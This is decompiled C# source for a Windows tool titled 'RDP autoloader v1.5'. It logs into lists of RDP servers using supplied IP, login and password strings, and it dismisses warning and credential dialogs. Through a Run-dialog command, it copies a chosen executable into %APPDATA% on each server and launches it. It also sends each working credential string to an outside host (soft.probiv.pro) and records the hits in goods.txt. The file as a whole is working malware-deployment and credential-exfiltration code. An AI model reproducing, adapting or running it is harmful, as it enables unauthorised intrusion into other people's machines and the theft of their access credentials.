using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using AxMSTSCLib;

namespace VdsFileUploader
{
	public class Form1 : Form
	{
		public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

		private const int KEYEVENTF_EXTENDEDKEY = 1;

		private const int KEYEVENTF_KEYUP = 2;

		private const byte VK_LWIN = 91;

		private const int WM_KEYDOWN = 256;

		private const int WM_KEYUP = 257;

		private const int WM_CLOSE = 16;

		private const int WM_DESTROY = 2;

		private static string[] curwinclasses = new string[3]
		{
			"UIMainClass",
			"UIContainerClass",
			"IHWindowClass"
		};

		private Queue<string> dedics;

		private bool Working;

		private string filepath;

		private string filename;

		private IntPtr formhwnd;

		private ManualResetEvent[] _ThreadSignals;

		private object csect;

		private object csectbuf;

		private object csectfile;

		private IContainer components;

		private TextBox t1;

		private GroupBox groupBox1;

		private Button go;

		private TextBox t2;

		private OpenFileDialog openFileDialog;

		private Button browse;

		private AxMsRdpClient6NotSafeForScripting rdp;

		private AxMsRdpClient6NotSafeForScripting rdp1;

		private AxMsRdpClient6NotSafeForScripting rdp3;

		private AxMsRdpClient6NotSafeForScripting rdp2;

		[DllImport("user32.dll")]
		private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

		[DllImport("user32.dll")]
		private static extern bool PostMessage(IntPtr hWnd, uint Msg, uint wParam, uint lParam);

		[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		private static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);

		[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		private static extern uint MapVirtualKey(uint uCode, uint uMapType);

		[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

		[DllImport("user32.dll")]
		private static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

		[DllImport("user32.dll")]
		private static extern int SendMessage(IntPtr hWnd, int wMsg, uint wParam, uint lParam);

		public Form1()
			: this()
		{
			InitializeComponent();
			Working = false;
			formhwnd = ((Control)this).get_Handle();
			csect = new object();
			csectbuf = new object();
			csectfile = new object();
		}

		private bool Checkrdp()
		{
			string[] array = dedics.ToArray();
			for (int i = 0; i < array.Length; i++)
			{
				if (!array[i].Contains("@") || !array[i].Contains("."))
				{
					return false;
				}
			}
			return true;
		}

		private void browse_Click(object sender, EventArgs e)
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				((CommonDialog)openFileDialog).ShowDialog((IWin32Window)(object)this);
				if (!string.IsNullOrWhiteSpace(((FileDialog)openFileDialog).get_FileName()))
				{
					((Control)t2).set_Text(((FileDialog)openFileDialog).get_FileName());
					filename = openFileDialog.get_SafeFileName();
				}
			}
			catch (Exception)
			{
			}
		}

		private void go_Click(object sender, EventArgs e)
		{
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_003f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0054: Unknown result type (might be due to invalid IL or missing references)
			//IL_008f: Unknown result type (might be due to invalid IL or missing references)
			if (Working)
			{
				MessageBox.Show((IWin32Window)(object)this, "Already working!");
				return;
			}
			dedics = new Queue<string>((IEnumerable<string>)((TextBoxBase)t1).get_Lines());
			if (dedics.get_Count() < 1)
			{
				MessageBox.Show((IWin32Window)(object)this, "There are no rdp servers!");
				return;
			}
			if (!Checkrdp())
			{
				MessageBox.Show((IWin32Window)(object)this, "Incorrect RDP strings format!");
				return;
			}
			if (!((Control)t2).get_Text().Contains(":\\") || !((Control)t2).get_Text().Contains(".exe"))
			{
				MessageBox.Show((IWin32Window)(object)this, "You need to browse the .exe file");
				return;
			}
			filepath = ((Control)t2).get_Text();
			Working = true;
			ThreadStart start = ControllerThreadProc;
			Thread thread = new Thread(start);
			thread.IsBackground = true;
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
		}

		private void ControllerThreadProc()
		{
			ThrParams[] array = new ThrParams[4];
			_ThreadSignals = new ManualResetEvent[4];
			for (int i = 0; i < 4; i++)
			{
				_ThreadSignals[i] = new ManualResetEvent(initialState: false);
				array[i] = new ThrParams();
				array[i].Ts = _ThreadSignals[i];
			}
			array[0].Rdp = rdp;
			array[1].Rdp = rdp1;
			array[2].Rdp = rdp2;
			array[3].Rdp = rdp3;
			for (int j = 0; j < 4; j++)
			{
				Thread thread = new Thread(new ParameterizedThreadStart(WorkThreadProc));
				thread.IsBackground = true;
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start(array[j]);
			}
			for (int k = 0; k < _ThreadSignals.Length; k++)
			{
				WaitHandle.WaitAny(new WaitHandle[1]
				{
					_ThreadSignals[k]
				});
			}
			Working = false;
			((Control)this).Invoke((Delegate)(Action)delegate
			{
				//IL_0006: Unknown result type (might be due to invalid IL or missing references)
				MessageBox.Show((IWin32Window)(object)this, "Done!");
			});
		}

		private void WorkThreadProc(object thrparams)
		{
			//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
			//IL_0105: Expected O, but got Unknown
			//IL_0300: Unknown result type (might be due to invalid IL or missing references)
			//IL_0307: Expected O, but got Unknown
			AxMsRdpClient6NotSafeForScripting Rdp = ((ThrParams)thrparams).Rdp;
			string text = "cmd.exe /c copy /Y \"\\\\tsclient\\" + filepath.Replace(":", "") + "\" \"%APPDATA%\\" + filename + "\" && start \"\" \"%APPDATA%\\" + filename + "\"";
			string text2 = "";
			string ip;
			int port;
			string login;
			string pass;
			IntPtr hWindow;
			while (text2 != null)
			{
				try
				{
					Monitor.Enter(dedics);
					if (dedics.get_Count() > 0)
					{
						text2 = dedics.Dequeue();
						((Control)t1).Invoke((Delegate)(Action)delegate
						{
							((TextBoxBase)t1).set_Lines(dedics.ToArray());
						});
					}
					else
					{
						text2 = null;
					}
					Monitor.Exit(dedics);
					if (text2 != null)
					{
						Regex val = new Regex("(?<ipport>[^\\@]+)\\@(?<logpass>.*)");
						Match val2 = val.Match(text2);
						if (!((Group)val2).get_Success())
						{
							throw new Exception("Не могу распарсить дедик");
						}
						ip = ((Capture)val2.get_Groups().get_Item("ipport")).get_Value();
						port = 0;
						if (ip.Contains(";") || ip.Contains(":"))
						{
							port = int.Parse(ip.Split(';', ':')[1]);
							ip = ip.Split(';', ':')[0];
						}
						login = ((Capture)val2.get_Groups().get_Item("logpass")).get_Value().Split(';', ':')[0];
						pass = ((Capture)val2.get_Groups().get_Item("logpass")).get_Value().Split(';', ':')[1];
						string str = "/?log=" + text2;
						((Control)this).Invoke((Delegate)(Action)delegate
						{
							Rdp.set_Server(ip);
							if (port > 0)
							{
								Rdp.get_AdvancedSettings2().set_RDPPort(port);
							}
							Rdp.set_UserName(login);
							Rdp.get_AdvancedSettings7().set_ClearTextPassword(pass);
							Rdp.get_AdvancedSettings7().set_AuthenticationLevel(0u);
							Rdp.get_AdvancedSettings7().set_EnableCredSspSupport(true);
							Rdp.get_AdvancedSettings2().set_overallConnectionTimeout(30);
							Rdp.get_AdvancedSettings2().set_allowBackgroundInput(1);
							Rdp.get_SecuredSettings2().set_KeyboardHookMode(1);
							Rdp.set_ColorDepth(16);
							Rdp.get_AdvancedSettings7().set_RedirectDrives(true);
							Rdp.Connect();
						});
						int num = 0;
						while (Rdp.get_Connected() != 1)
						{
							Thread.Sleep(1000);
							num++;
							if (num > 30)
							{
								throw new Exception("Таймаут подключения");
							}
							bool dialog = false;
							Monitor.Enter(csect);
							EnumWindows(delegate(IntPtr wnd, IntPtr param)
							{
								IntPtr window = GetWindow(wnd, 4u);
								if (window == formhwnd)
								{
									StringBuilder stringBuilder = new StringBuilder(256);
									GetClassName(wnd, stringBuilder, stringBuilder.Capacity);
									if (string.Compare(stringBuilder.ToString(), "#32770") == 0)
									{
										dialog = true;
										Thread.Sleep(500);
										PostMessage(wnd, 273u, 2u, 0u);
										Thread.Sleep(1000);
										return false;
									}
									if (string.Compare(stringBuilder.ToString(), "Credential Dialog Xaml Host", ignoreCase: true) == 0)
									{
										dialog = true;
										Thread.Sleep(500);
										PostMessage(wnd, 2u, 0u, 0u);
										PostMessage(wnd, 16u, 0u, 0u);
										Thread.Sleep(1000);
										return false;
									}
								}
								return true;
							}, IntPtr.Zero);
							Monitor.Exit(csect);
							if (dialog)
							{
								throw new Exception("Ошибка подключения (диалоговое окно, ошибка авторизации и пр)");
							}
						}
						Thread.Sleep(12000);
						WebClient val3 = new WebClient();
						try
						{
							val3.DownloadString("http://soft.probiv.pro" + str);
						}
						finally
						{
							((IDisposable)val3)?.Dispose();
						}
						Monitor.Enter(csectfile);
						File.AppendAllText("goods.txt", text2 + "\r\n");
						Monitor.Exit(csectfile);
						hWindow = default(IntPtr);
						((Control)this).Invoke((Delegate)(Action)delegate
						{
							hWindow = ((Control)Rdp).get_Handle();
						});
						Thread.Sleep(200);
						hWindow = FindWindowEx(hWindow, IntPtr.Zero, curwinclasses[0], null);
						hWindow = FindWindowEx(hWindow, IntPtr.Zero, curwinclasses[1], null);
						hWindow = FindWindowEx(hWindow, IntPtr.Zero, curwinclasses[2], null);
						KeyboardSend.KeyDown(hWindow, (Keys)91, special: true);
						KeyboardSend.KeyDown(hWindow, (Keys)82, special: false);
						Thread.Sleep(100);
						KeyboardSend.KeyUp(hWindow, (Keys)91, special: true);
						KeyboardSend.KeyUp(hWindow, (Keys)82, special: false);
						Thread.Sleep(1000);
						Monitor.Enter(csectbuf);
						Clipboard.SetText(text);
						Thread.Sleep(500);
						KeyboardSend.KeyDown(hWindow, (Keys)17, special: true);
						KeyboardSend.KeyDown(hWindow, (Keys)86, special: false);
						KeyboardSend.KeyUp(hWindow, (Keys)17, special: true);
						KeyboardSend.KeyUp(hWindow, (Keys)86, special: false);
						Thread.Sleep(1000);
						KeyboardSend.KeyDown(hWindow, (Keys)13, special: false);
						KeyboardSend.KeyUp(hWindow, (Keys)13, special: false);
						Monitor.Exit(csectbuf);
						Thread.Sleep(40000);
						KeyboardSend.KeyDown(hWindow, (Keys)37, special: true);
						KeyboardSend.KeyUp(hWindow, (Keys)37, special: true);
						Thread.Sleep(1000);
						KeyboardSend.KeyDown(hWindow, (Keys)13, special: false);
						KeyboardSend.KeyUp(hWindow, (Keys)13, special: true);
						Thread.Sleep(15000);
					}
				}
				catch (Exception ex)
				{
					Monitor.Enter(csectfile);
					File.AppendAllText("bugs.txt", text2 + " - " + ex.Message + "\r\n");
					Monitor.Exit(csectfile);
				}
				try
				{
					if (Rdp.get_Connected() > 0)
					{
						Rdp.Disconnect();
					}
					while (Rdp.get_Connected() != 0)
					{
						Thread.Sleep(500);
					}
					Thread.Sleep(1000);
				}
				catch (Exception ex2)
				{
					Monitor.Enter(csectfile);
					File.AppendAllText("bugs.txt", ex2.Message + "\r\n");
					Monitor.Exit(csectfile);
				}
			}
			((ThrParams)thrparams).Ts.Set();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				((IDisposable)components).Dispose();
			}
			((Form)this).Dispose(disposing);
		}

		private void InitializeComponent()
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Expected O, but got Unknown
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected O, but got Unknown
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_0031: Expected O, but got Unknown
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_003c: Expected O, but got Unknown
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Expected O, but got Unknown
			//IL_0048: Unknown result type (might be due to invalid IL or missing references)
			//IL_0052: Expected O, but got Unknown
			//IL_0053: Unknown result type (might be due to invalid IL or missing references)
			//IL_005d: Expected O, but got Unknown
			//IL_005e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0068: Expected O, but got Unknown
			//IL_0069: Unknown result type (might be due to invalid IL or missing references)
			//IL_0073: Expected O, but got Unknown
			//IL_0074: Unknown result type (might be due to invalid IL or missing references)
			//IL_007e: Expected O, but got Unknown
			//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
			//IL_0112: Unknown result type (might be due to invalid IL or missing references)
			//IL_0164: Unknown result type (might be due to invalid IL or missing references)
			//IL_018e: Unknown result type (might be due to invalid IL or missing references)
			//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
			//IL_01f1: Unknown result type (might be due to invalid IL or missing references)
			//IL_0247: Unknown result type (might be due to invalid IL or missing references)
			//IL_027a: Unknown result type (might be due to invalid IL or missing references)
			//IL_02a9: Unknown result type (might be due to invalid IL or missing references)
			//IL_02cd: Unknown result type (might be due to invalid IL or missing references)
			//IL_032f: Unknown result type (might be due to invalid IL or missing references)
			//IL_035a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0364: Expected O, but got Unknown
			//IL_0374: Unknown result type (might be due to invalid IL or missing references)
			//IL_03a6: Unknown result type (might be due to invalid IL or missing references)
			//IL_03d1: Unknown result type (might be due to invalid IL or missing references)
			//IL_03db: Expected O, but got Unknown
			//IL_03eb: Unknown result type (might be due to invalid IL or missing references)
			//IL_041e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0449: Unknown result type (might be due to invalid IL or missing references)
			//IL_0453: Expected O, but got Unknown
			//IL_0463: Unknown result type (might be due to invalid IL or missing references)
			//IL_0493: Unknown result type (might be due to invalid IL or missing references)
			//IL_04be: Unknown result type (might be due to invalid IL or missing references)
			//IL_04c8: Expected O, but got Unknown
			//IL_04d8: Unknown result type (might be due to invalid IL or missing references)
			//IL_04fa: Unknown result type (might be due to invalid IL or missing references)
			//IL_0516: Unknown result type (might be due to invalid IL or missing references)
			//IL_05b4: Unknown result type (might be due to invalid IL or missing references)
			//IL_05be: Expected O, but got Unknown
			ComponentResourceManager val = new ComponentResourceManager(typeof(Form1));
			t1 = new TextBox();
			groupBox1 = new GroupBox();
			go = new Button();
			t2 = new TextBox();
			openFileDialog = new OpenFileDialog();
			browse = new Button();
			rdp = new AxMsRdpClient6NotSafeForScripting();
			rdp1 = new AxMsRdpClient6NotSafeForScripting();
			rdp3 = new AxMsRdpClient6NotSafeForScripting();
			rdp2 = new AxMsRdpClient6NotSafeForScripting();
			((Control)groupBox1).SuspendLayout();
			((ISupportInitialize)rdp).BeginInit();
			((ISupportInitialize)rdp1).BeginInit();
			((ISupportInitialize)rdp3).BeginInit();
			((ISupportInitialize)rdp2).BeginInit();
			((Control)this).SuspendLayout();
			((Control)t1).set_Dock((DockStyle)5);
			((Control)t1).set_Location(new Point(3, 16));
			((TextBoxBase)t1).set_Multiline(true);
			((Control)t1).set_Name("t1");
			t1.set_ScrollBars((ScrollBars)3);
			((Control)t1).set_Size(new Size(213, 263));
			((Control)t1).set_TabIndex(1);
			((Control)t1).set_Text("123.123.123.123:54321@user;password");
			((TextBoxBase)t1).set_WordWrap(false);
			((Control)groupBox1).get_Controls().Add((Control)(object)t1);
			((Control)groupBox1).set_Location(new Point(12, 12));
			((Control)groupBox1).set_Name("groupBox1");
			((Control)groupBox1).set_Size(new Size(219, 282));
			((Control)groupBox1).set_TabIndex(2);
			groupBox1.set_TabStop(false);
			((Control)groupBox1).set_Text("RDP servers (ip[:port]@login:pass)");
			((Control)go).set_Location(new Point(124, 323));
			((Control)go).set_Name("go");
			((Control)go).set_Size(new Size(107, 23));
			((Control)go).set_TabIndex(3);
			((Control)go).set_Text("Start");
			((ButtonBase)go).set_UseVisualStyleBackColor(true);
			((Control)go).add_Click((EventHandler)go_Click);
			((Control)t2).set_Location(new Point(12, 297));
			((Control)t2).set_Name("t2");
			((TextBoxBase)t2).set_ReadOnly(true);
			((Control)t2).set_Size(new Size(219, 20));
			((Control)t2).set_TabIndex(4);
			((FileDialog)openFileDialog).set_RestoreDirectory(true);
			((Control)browse).set_Location(new Point(12, 323));
			((Control)browse).set_Name("browse");
			((Control)browse).set_Size(new Size(107, 23));
			((Control)browse).set_TabIndex(6);
			((Control)browse).set_Text("Browse");
			((ButtonBase)browse).set_UseVisualStyleBackColor(true);
			((Control)browse).add_Click((EventHandler)browse_Click);
			((AxHost)rdp).set_Enabled(true);
			((Control)rdp).set_Location(new Point(247, 16));
			((Control)rdp).set_Name("rdp");
			((AxHost)rdp).set_OcxState((State)((ResourceManager)(object)val).GetObject("rdp.OcxState"));
			((Control)rdp).set_Size(new Size(432, 330));
			((Control)rdp).set_TabIndex(8);
			((AxHost)rdp1).set_Enabled(true);
			((Control)rdp1).set_Location(new Point(247, 352));
			((Control)rdp1).set_Name("rdp1");
			((AxHost)rdp1).set_OcxState((State)((ResourceManager)(object)val).GetObject("rdp1.OcxState"));
			((Control)rdp1).set_Size(new Size(432, 330));
			((Control)rdp1).set_TabIndex(9);
			((AxHost)rdp3).set_Enabled(true);
			((Control)rdp3).set_Location(new Point(685, 352));
			((Control)rdp3).set_Name("rdp3");
			((AxHost)rdp3).set_OcxState((State)((ResourceManager)(object)val).GetObject("rdp3.OcxState"));
			((Control)rdp3).set_Size(new Size(432, 330));
			((Control)rdp3).set_TabIndex(11);
			((AxHost)rdp2).set_Enabled(true);
			((Control)rdp2).set_Location(new Point(685, 16));
			((Control)rdp2).set_Name("rdp2");
			((AxHost)rdp2).set_OcxState((State)((ResourceManager)(object)val).GetObject("rdp2.OcxState"));
			((Control)rdp2).set_Size(new Size(432, 330));
			((Control)rdp2).set_TabIndex(10);
			((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
			((Form)this).set_ClientSize(new Size(1131, 693));
			((Control)this).get_Controls().Add((Control)(object)rdp3);
			((Control)this).get_Controls().Add((Control)(object)rdp2);
			((Control)this).get_Controls().Add((Control)(object)rdp1);
			((Control)this).get_Controls().Add((Control)(object)rdp);
			((Control)this).get_Controls().Add((Control)(object)browse);
			((Control)this).get_Controls().Add((Control)(object)t2);
			((Control)this).get_Controls().Add((Control)(object)go);
			((Control)this).get_Controls().Add((Control)(object)groupBox1);
			((Form)this).set_Icon((Icon)((ResourceManager)(object)val).GetObject("$this.Icon"));
			((Control)this).set_Name("Form1");
			((Form)this).set_StartPosition((FormStartPosition)1);
			((Control)this).set_Text("RDP autoloader v1.5");
			((Control)groupBox1).ResumeLayout(false);
			((Control)groupBox1).PerformLayout();
			((ISupportInitialize)rdp).EndInit();
			((ISupportInitialize)rdp1).EndInit();
			((ISupportInitialize)rdp3).EndInit();
			((ISupportInitialize)rdp2).EndInit();
			((Control)this).ResumeLayout(false);
			((Control)this).PerformLayout();
		}
	}
}
